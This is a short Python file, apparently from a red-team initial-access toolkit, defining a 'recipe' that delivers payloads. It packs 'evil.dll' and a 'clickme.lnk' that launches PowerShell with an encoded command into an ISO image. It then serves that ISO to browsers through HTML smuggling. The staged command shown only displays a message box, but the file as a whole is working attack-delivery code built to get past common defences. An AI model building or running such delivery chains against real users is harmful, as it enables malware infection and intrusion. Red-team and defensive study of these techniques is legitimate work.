from typing import List

from make.htmlsmuggling.htmlsmuggling import makeHtmlSmuggling
from make.lnk.lnk import makeLnk
from make.iso.iso import makeIso
from make.powershell.powershell import *
from make.zip.zip import makeZip
from make.vbs.vbs import *
from make.hta.hta import *
from make.onenote.onenote import *
from make.bat.bat import *

from helpers import readFileContent, saveAceFile, makeAceFile
from model import AceFile, AceRoute
from web import serve


def recipe1() -> List[AceRoute]:
    # HTML Smuggling -> ISO -> ( LNK -> Powershell:Load&Exec <- DLL )

    # DLL
    dllData: AceBytes = readFileContent('payloads/evil.dll')
    dllFile: AceFile = makeAceFile('evil.dll', dllData)

    psMsgbox: AceStr = makePsScriptMessagebox()
    # LNK to powershell.exe to execute DLL
    execData: AceStr = makePsEncodedCommand(
        input=psMsgbox,
    )
    lnkData: AceBytes = makeLnk(
        name = "clickme.lnk",
        target = "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
        arguments = "-EncodedCommand {}".format(execData),
    )
    lnkFile: AceFile = makeAceFile('clickme.lnk', lnkData)

    # Pack DLL and LNK into ISO
    container: AceBytes = makeIso(
        files = [
            dllFile,
            lnkFile,
        ],
    )
    containerFile: AceFile = makeAceFile('test.iso', container)

    # HTML to serve ISO
    html: AceStr = makeHtmlSmuggling(
        containerFile,
    )
    serveHtml: AceRoute = AceRoute('/test', html)
    return([serveHtml])
